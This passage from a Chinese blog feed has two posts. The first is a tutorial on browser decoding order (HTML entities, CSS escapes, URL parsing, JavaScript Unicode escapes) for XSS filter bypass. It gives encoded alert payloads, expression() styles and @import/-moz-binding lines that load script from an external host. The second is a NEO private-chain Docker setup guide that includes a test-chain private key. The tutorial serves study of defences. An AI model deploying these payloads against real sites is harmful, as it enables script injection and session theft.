src="http://ww4.sinaimg.cn/large/006iKNp3gy1fult7852h9j30et03x3yd.jpg" alt="s8.png"></p><p>虽然会有报错说明，但是也是可以识别的。</p><h2 id="CSS编码"><a href="#CSS编码" class="headerlink" title="CSS编码"></a>CSS编码</h2><p>由于CSS通过expression方法控制js，但是只有在IE浏览器中可以使用，但是也已经很早就废弃了，只做一些简单的了解。<br>除此之外还可以通过引入外部链接，文件，url地址来执行js脚本</p><p><strong>CSS 编码解析</strong>是用了一套不太正统的转义策略：<strong>用一个反斜杠，后边跟1~6位十六进制数字构成。</strong>，所以字母e 可以编码为 \65, \065,\000065。</p><p>而因为这样，后边就不能直接紧跟数字或字母，否则会被当成转义里的内容处理，所以CSS 选择了空格作为终止标识，在解码的时候，再将空格去除。</p><p>CSS还支持直接使用反斜杠对非十六进制字符进行转义的方式，就按紧跟着反斜杠后边的字符的字面意思进行解释，这种机制可用来转义引号和反斜杠本身，不过不能转义HTML 控制的字符，比如尖括号，那是因为HTML 解析器总是先于CSS 解析器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://ha.ckers.org/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-bingding</span>:<span class="built_in">url</span>(<span class="string">"http://ha.ckers.org/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('xss'))"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- IE低版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression(alert(1));"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression\028 alert \028 1 \029 \029;"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h2><p>我们都知道浏览器发送到服务器时，服务器会对url进行一次URL解析然后处理。</p><p>那么浏览器中也会进行对于URL的解析。<br>比如html中的<code>&lt;a&gt;</code>标签的<code>href</code>属性，url解析器会对href内部的内容进行一次url解析<br>js中的<code>window.open()</code>,url解析器会对括号内部的内容进行一次url解析</p><p>URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。<br>这个协议类型的格式是<code>javascript:</code>不是只是<code>javascript</code></p><p>除此了<code>javascript:</code>伪协议可以执行js代码之外，还有IE下的<code>vbscript</code>,Mozilla下的<code>dataURL</code>(data:text/html;这里可以直接添加html的<code>&lt;script&gt;标签，会执行</code>)</p><h2 id="unicode编码-javascript解析器"><a href="#unicode编码-javascript解析器" class="headerlink" title="unicode编码 javascript解析器"></a>unicode编码 javascript解析器</h2><p>说明一些javascript解析器的入口：</p><ul><li><code>&lt;script&gt;</code>标签</li><li><code>onlick</code>等事件js的动作</li><li>url调用<code>javascript:</code>伪协议</li><li><code>css</code>调用引入文件，或url再间接引入javascript:</li><li><code>eval()</code>调用</li><li>定时器触发</li></ul><p><strong>Unicode转义序列</strong>：<code>&quot;\uXXXX&quot;</code>，表示一个字符，其中xxxx表示一个16进制数字，如 “&lt;” Unicode编码为 “\u003c”。</p><blockquote><p>js编码还有一种普通十六进制 \xAA</p></blockquote><p>Unicode转义序列出现的地方。从上下文来看，可以分为三个地方：字符串中，标识符名称中和控制字符中。</p><ul><li>字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。</li><li>标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</li><li>控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。</li></ul><p>JavaScript解析时只有<strong>标识符名称</strong>不会被当做字符串，<strong>控制字符</strong>仅会被解析为标示符名称或者字符串</p><p>Javascript解析器工作的时候可以将<code>\u0061\u006c\u0065\u0072\u0074</code>进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。</p><p>所以unicode解码后的字符串，不能截断语句，不能有控制语法的功能，只能作为字符串，或标识符。</p><p>即，在绕过时，能编码的部分，不能包括控制符号如<code>(</code>,<code>)</code>,<code>;</code>,<code>&quot;</code>,<code>&#39;</code>等。解码后只作为字符串，或标识符名称处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1);\u0061lert(2)"</span>&gt;</span>test0<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)\u003b\u0061lert(2)"</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test0 可以弹框两个。test1不弹框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(\u0031)"</span>)&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\u0031')"</span>)&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>)&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)"</span>)&gt;</span>test5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript\u003aalert(1)"</span>)&gt;</span>test6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('1\u000a')"</span>)&gt;</span>test7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">测试</th><th style="text-align:center">结果 </th></tr></thead><tbody><tr><td style="text-align:center">test</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test1</td><td style="text-align:center">失败，解析为字符串1，需要单引号</td></tr><tr><td style="text-align:center">test2</td><td style="text-align:center">弹框，编码<code>&#39;</code>则失败</td></tr><tr><td style="text-align:center">test3</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test4</td><td style="text-align:center">失败，编码括号</td></tr><tr><td style="text-align:center">test5</td><td style="text-align:center">失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接</td></tr><tr><td style="text-align:center">test6</td><td style="text-align:center">失败，同上，寻找相对路径链接</td></tr><tr><td style="text-align:center">test7</td><td style="text-align:center">弹框，可以添加换行符，不受印象。\u000a 换行符</td></tr></tbody></table><h2 id="判断解析流程-url"><a href="#判断解析流程-url" class="headerlink" title="判断解析流程 url"></a>判断解析流程 url</h2><p>上面分别提了三种编码，然后把URL解码，跟js解码结合在一起举了个例子。<br>可以尝试判断以下html代码再浏览器中的解析流程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('value1')"</span> <span class="attr">href</span>=<span class="string">"javascript:window.open(value2)"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Value1：HTML解码 -&gt; JavaScript解码 -&gt; URL解码<br>Value2：HTML解码 -&gt; URL解码 -&gt; JavaScript解码 -&gt; URL解码</p><p>对value1进行细节分析：</p><ul><li>HTML解码：因为a标签可以顺利生成DOM树，对<code>window.open(&#39;value1&#39;)</code>和<code>javascript:window,open(value2)</code>进行HTML解码</li><li>JavaScript解码：因为onclick属性，对其中内容进行JS unicode解码<code>window.open(&#39;value1&#39;)</code></li><li>URL解码：window.open打开一个url，对其中内容进行url解码<code>value1</code></li></ul><p>尝试判断value1最严格编码：</p><ul><li>URL编码：<code>value1</code>。只能对value1，不能对<code>&#39;value1&#39;</code></li><li>JS编码：<code>window</code>,<code>open</code>,<code>%76%61%6c%75%65%31</code>。不能对<code>.</code>,<code>(</code>,<code>)</code>,<code>&#39;</code>编码</li><li>html实体编码：全部。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 未编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('value1')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- URL编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('%76%61%6c%75%65%31')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 继续js编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"\u0077\u0069\u006e\u0064\u006f\u0077.\u006f\u0070\u0065\u006e('\u0025\u0037\u0036\u0025\u0036\u0031\u0025\u0036\u0063\u0025\u0037\u0035\u0025\u0036\u0035\u0025\u0033\u0031')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 继续全部html实体编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x39;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x65;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x34;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x66;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x66;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x30;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x65;&amp;#x28;&amp;#x27;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x31;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x33;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x33;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x31;&amp;#x27;&amp;#x29;"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>value2 也是差不多意思了。</p><h2 id="判断解析流程-DOM"><a href="#判断解析流程-DOM" class="headerlink" title="判断解析流程 DOM"></a>判断解析流程 DOM</h2><p>基于DOM的解析流程 也会有所不同。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"1"</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"1"</span>).innerHTML = <span class="string">"&lt;img src=&amp;#35; on\u0065rror=&amp;#97;lert&amp;#40;1)&gt;"</span>;  </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析过程：JS解析 -&gt; html解析 </p><ul><li>js解析：进入script标签时，进行一个js解析。还原了onerror</li><li>html解析：DOM修改完html标签后，会重新建立DOM树，对其中节点重新html实体编码解析</li></ul><hr><h1 id="自测"><a href="#自测" class="headerlink" title="自测"></a>自测</h1><p>如果做出了以下题目，应该可以说是掌握了。<br><a href="http://test.attacker-domain.com/browserparsing/tests.html" target="_blank" rel="noopener">题目</a><br><a href="http://test.attacker-domain.com/browserparsing/answers.txt" target="_blank" rel="noopener">答案</a></p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>html 在生成DOM树时不会html实体编码解码<code>&lt;script&gt;</code>标签中的内容</li><li>如果<code>&lt;script&gt;</code>标签修改了DOM树，会对其中的节点内容进行html实体编码解析</li><li>js编码 对控制符无效，对字符串有效</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/slly/p/6640761.html" target="_blank" rel="noopener">https://www.cnblogs.com/slly/p/6640761.html</a><br><a href="https://www.cnblogs.com/yanglang/p/7090120.html" target="_blank" rel="noopener">https://www.cnblogs.com/yanglang/p/7090120.html</a><br><a href="https://segmentfault.com/a/1190000009975744" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009975744</a><br><a href="https://www.jianshu.com/p/cfdf1747d30e" target="_blank" rel="noopener">https://www.jianshu.com/p/cfdf1747d30e</a><br><a href="https://blog.csdn.net/qq_35513598/article/details/79861908" target="_blank" rel="noopener">https://blog.csdn.net/qq_35513598/article/details/79861908</a><br><a href="https://security.yirendai.com/news/share/26" target="_blank" rel="noopener">https://security.yirendai.com/news/share/26</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 被怼番之后，好好学习基础原理 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://lalajun.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="浏览器" scheme="http://lalajun.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
      <category term="xss" scheme="http://lalajun.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>NEO-搭建私有链</title>
    <link href="http://lalajun.com/2018/08/15/NEO-%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/"/>
    <id>http://lalajun.com/2018/08/15/NEO-搭建私有链/</id>
    <published>2018-08-15T09:05:28.000Z</published>
    <updated>2018-09-07T11:52:49.075Z</updated>
    
    <content type="html"><![CDATA[<p>— cityofzion大法好 —</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>因为测试链不给GAS…只能自己搭建私有链。</p><p>关于NEO私有链的搭建，官网有教程，NEL有教程，毫无疑问，这些教程都很详细，很深入，很透彻……很麻烦…..<br>感觉搭建一个私有链，就是已经要了解整个区块链的机制哎，难道不是先给个实验的地方，然后一步步慢慢去了解么，都感觉本末倒置了。</p><p>没有链 -&gt; 雾里看花 -&gt; 测试链不给币 -&gt; 搭建私有链 -&gt; 超多麻烦 -&gt; 还是没有链 = 劝退</p><p>然后cityofzion的看上去最简单的拿着试了下。<br>cityofzion大法好！本以为会是一如既往艰难险阻疑无路的大坑，没想到！真的几步就好了！哇，这个社区太给力了<br>好好学习英语！</p><p><a href="https://hub.docker.com/r/cityofzion/neo-privatenet/" target="_blank" rel="noopener">docker镜像及说明</a><br><a href="https://github.com/CityOfZion/neo-privatenet-docker" target="_blank" rel="noopener">CityOfZion通过docker搭建NEO私有链</a></p><p>– 09.07 更新 –<br>重新更新，因为COZ的私有链 使用的不是最新版本的cli。<br>个人需要使用最近版本来验证一个漏洞，重新开始弄一个最新版本的私有链。<br>根据 官方的docker镜像 来构建私有链，稍微会麻烦一点，但是镜像会持续拉取最新版本的cli。</p><h1 id="基于CityOfZion的docker私有链"><a href="#基于CityOfZion的docker私有链" class="headerlink" title="基于CityOfZion的docker私有链"></a>基于CityOfZion的docker私有链</h1><p>可以只起neo私有链，还可以起配合neoscan的neo私有链。后者看后面的补充，可一步到位。</p><h2 id="两步搭建"><a href="#两步搭建" class="headerlink" title="两步搭建"></a>两步搭建</h2><hr><blockquote><p>前提 装好docker，会使用docker</p></blockquote><p>1.下载镜像<br><code>docker pull cityofzion/neo-privatenet</code><br>2.运行镜像<br><code>docker run --rm -d --name neo-privatenet -p 20333-20336:20333-20336/tcp -p 30333-30336:30333-30336/tcp cityofzion/neo-privatenet</code></p><h2 id="两步配置neo-gui"><a href="#两步配置neo-gui" class="headerlink" title="两步配置neo-gui"></a>两步配置neo-gui</h2><hr><blockquote><p>为了不出错，新下载一个neo-gui客户端来链接测试链，因为改测试链上的 需要删区块，没必要</p></blockquote><p>1.拷贝<a href="https://github.com/CityOfZion/neo-privatenet-docker/blob/master/configs/protocol.json" target="_blank" rel="noopener">protocol.json</a>到新neo-gui目录下<br>2.拷贝<a href="https://github.com/CityOfZion/neo-privatenet-docker/blob/master/configs/config-windows.json" target="_blank" rel="noopener">config.json</a>到新neo-gui目录下 </p><blockquote><p>如果docker不是在本机运行，而是在虚拟机或其他服务器上运行，修改以上两个配置文件中的 127.0.0.1/localhost 为 对应虚拟机IP地址</p></blockquote><p>启动 neo-gui 等待同步完成</p><h2 id="两步确认运行"><a href="#两步确认运行" class="headerlink" title="两步确认运行"></a>两步确认运行</h2><hr><p>如果不放心可以去确认区块的生成</p><p><code>docker exec -it neo-privatenet /bin/bash</code><br><code>screen -d -r node1</code></p><h2 id="一步有钱"><a href="#一步有钱" class="headerlink" title="一步有钱"></a>一步有钱</h2><hr><p>neo-gui中右键-导入-导入WIF-<code>KxDgvEKzgSBPPfuVfw67oPQBSjidEiqTHURKSDL1R7yGaGYAeYnr</code></p><p>搞定</p><h2 id="远程调用rpc"><a href="#远程调用rpc" class="headerlink" title="远程调用rpc"></a>远程调用rpc</h2><hr><p>远程调用rpc 就是利用neo-cli读取链上信息，以上操作已经开放远程调用。</p><p>私有链的远程调用端口是：<code>30333-30336</code></p><p>官网说明：<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="noopener">这里</a></p><p>使用方法：<br>GET:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://somewebsite.com:10332?jsonrpc=2.0&amp;method=getblockcount&amp;params=[]&amp;id=1</span><br></pre></td></tr></table></figure></p><p>POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://somewebsite.com:10332</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;getblockcount&quot;,</span><br><span class="line">  &quot;params&quot;: [],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><hr><p>接下来就是neo-gui的操作了，转到自己的账号上啦巴拉巴拉，有了测试链才能开始学习啊喂。</p><p>OKOK，收工</p><hr><h2 id="补充cli-rpc-开启–log选项说明"><a href="#补充cli-rpc-开启–log选项说明" class="headerlink" title="补充cli rpc 开启–log选项说明"></a>补充cli rpc 开启–log选项说明</h2><p><hr><br>使用cli rpc 只要有能发包的工具就行，但是理所当然的没有找到很好的浏览器插件，就用burpsuite了<br>通常的api都是可以调用的，<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="noopener">api查看</a></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqwbhktj30ra09vjt3.jpg" alt="22.png"></p><p>好吧，但是我调用这个就是为了查看notify输出信息。<br>之后调用 cli rpc 查看智能合约notify的时候发现，getapplicationlog api是不行的</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqrjzd4j30rc09x755.jpg" alt="11.png"></p><p>感觉应该是两步起来的私有链里面的cli并没有开<code>--log</code>功能。（之后尝试修改的时候发现确实是这样）<br>那么接下来就去私链里面开–log,操作就是——<strong>进入docker-关掉neo cli-修改-重开</strong></p><blockquote><p>此处还有另一个操作，就是再起一个cli节点，修改配置文件，开log连接至私有链，就不必去动docker</p></blockquote><p>进入docker：</p><ul><li><code>docker exec -it neo-privatenet /bin/bash</code></li></ul><p><strong>关掉</strong>：</p><ul><li><code>screen -ls</code>：查看4个命令行正在运行四个共识节点neo-cli</li><li><code>screen -d -r node1</code>：进入这个命令行</li><li><code>ctrl + c</code>：终止这个进程</li><li>相同的重复四次 终止 node1 到 node4 每一个终止完需要等一会，会自动回到原来命令行</li></ul><p><strong>修改</strong>：</p><ul><li><code>vi /opt/start_consensus_node.sh</code>:修改已有的脚本</li><li><code>spawn dotnet neo-cli.dll --rpc</code> -&gt; <code>spawn dotnet neo-cli.dll --rpc --log</code></li><li><code>:wq</code>保存</li></ul><p><strong>重开</strong>：</p><ul><li><code>cd /opt</code>：移动目录</li><li><code>./run.sh</code>：执行已有的脚本，这个脚本调用了我们刚才改的脚本</li><li>一段时间之后ctrl+c终止脚本，另外四个进程其实已经在后台运行了</li></ul><p><strong>检查</strong>：看自己gui会不会更新，或者前文提到的检查docker内部</p><p><strong>提醒</strong>：记得等上链之后再调用rpc，不然还是会一样的不行</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fubnqzkg7yj30qn081my9.jpg" alt="33.png"></p><h2 id="补充加上neonscan"><a href="#补充加上neonscan" class="headerlink" title="补充加上neonscan"></a>补充加上neonscan</h2><p>因为要使用neon.js，需要有数据库层面对外的接口按照教程重新加了下。<br><a href="https://github.com/slipo/neo-scan-docker" target="_blank" rel="noopener">教程</a></p><p>需要停掉之前的<code>cityofzion/neo-privatenet</code>镜像<br><code>docker stop 对应的容器id</code></p><p>自动起环境<br><code>git clone git@github.com:slipo/neo-scan-docker.git</code><br><code>cd neo-scan-docker</code><br><code>docker-compose up</code>：这个地方会自动进入neon-scan的页面，等到同步速度变慢，就是在正常出块了，然后放着不管就好了</p><p>修改host文件<br><code>vi /etc/host</code>：我的是在这里<br><code>127.0.0.1 neo-privnet</code>：添加这一行，必须修改，neonscan到neon私有链是通过这个<code>neo-privnet</code>域名链接的，具体可以看dockerfile</p><p>其实直接用这个这个还更方便更全面emm<br>如果是从一开始私有链过来的，私有链的所有块都可以直接继承，账号也是，之前设置的 neo-gui 可以直接用</p><p>但是需要cli rpc 开启–log选项的话，需要按照之前的操作重复一次，并且之前的log也都会不见</p><blockquote><p>私有链搭建在另一台服务器中时，把 <code>服务器ip neo-privnet</code> 写到自己本机的host中 可以避免使用neon.js的一个坑</p></blockquote><blockquote><p>发现scan 有时候会莫名崩溃，不是特别的理解。但是重启就可以解决，进入拥有compose文件的neo-scan-docker目录<code>cd neo-scan-docker</code>。<code>docker-compose restart neo-scan</code>即可</p></blockquote><h2 id="崩溃处理"><a href="#崩溃处理" class="headerlink" title="崩溃处理"></a>崩溃处理</h2><p>2018/09/04更新。</p><p>今天用着用着私链崩溃，无法同步，也无法生成区块了。在写代码，不想再花精力去弄，直接删掉镜像和数据，重启了一个私有链。</p><p>结果发现有一个节点莫名其妙的开始区块超前。简直无法理解啊。但是三个节点仍然可以生成区块的，也没考虑那么多。</p><p>使用neon.js从neoscan读取节点广播交易的时候发现，一直都广播失败，很绝望。最后发现，选取节点广播交易时，都会使用区块高度最高的那个节点，去广播交易。</p><p>就是一直在使用坏掉的那个节点。所以一直广播失败。直接把那个节点关了即可。</p><p>个人感觉应该是docker镜像数据残留的问题？但是处理好了，万幸。</p><h1 id="基于官方docker镜像起私有链"><a href="#基于官方docker镜像起私有链" class="headerlink" title="基于官方docker镜像起私有链"></a>基于官方docker镜像起私有链</h1><p><a href="https://github.com/NewEconoLab/Docs/blob/master/study/DevOps/DockerNeoPrivatenet.md" target="_blank" rel="noopener">官方教程</a></p><p>讲的还是比较清楚的，没必要多余说明，但是有一些坑啊。</p><h2 id="无法启动neo-cli"><a href="#无法启动neo-cli" class="headerlink" title="无法启动neo-cli"></a>无法启动neo-cli</h2><p>当<code>donet neo-cli.dll /rpc</code>的时候</p><p><img src alt="坑0.png"></p><p>是官方配置文件有问题</p><p><img src alt="坑1.png"></p><p>感觉是老版本的cli配置文件。需要修改为右边的<code>ApplicationLogs</code>,就可以启动</p><p><img src alt="坑3.png"></p><h2 id="私有链端口映射有问题"><a href="#私有链端口映射有问题" class="headerlink" title="私有链端口映射有问题"></a>私有链端口映射有问题</h2><p><img src alt="坑4.png"></p><p>以上是通过官方镜像compose产生的4个镜像<br>端口映射：</p><ul><li>cli0 10331-10334 -&gt; 10331-10334</li><li>cli1 20331-20334 -&gt; 10331-10334</li><li>cli2 30331-30334 -&gt; 10331-10334</li><li>cli3 40331-40334 -&gt; 10331-10334</li></ul><p>实际上一个 cli容器 只会映射出一个端口</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— cityofzion大法好 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="NEO" scheme="http://lalajun.com/tags/NEO/"/>
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>NEO-智能合约JAVA c#环境</title>
    <link href="http://lalajun.com/2018/08/13/NEO-JAVA%E7%8E%AF%E5%A2%83/"/>
    <id>http://lalajun.com/2018/08/13/NEO-JAVA环境/</id>
    <published>2018-08-13T09:05:28.000Z</published>
    <updated>2018-08-15T08:19:08.272Z</updated>
    
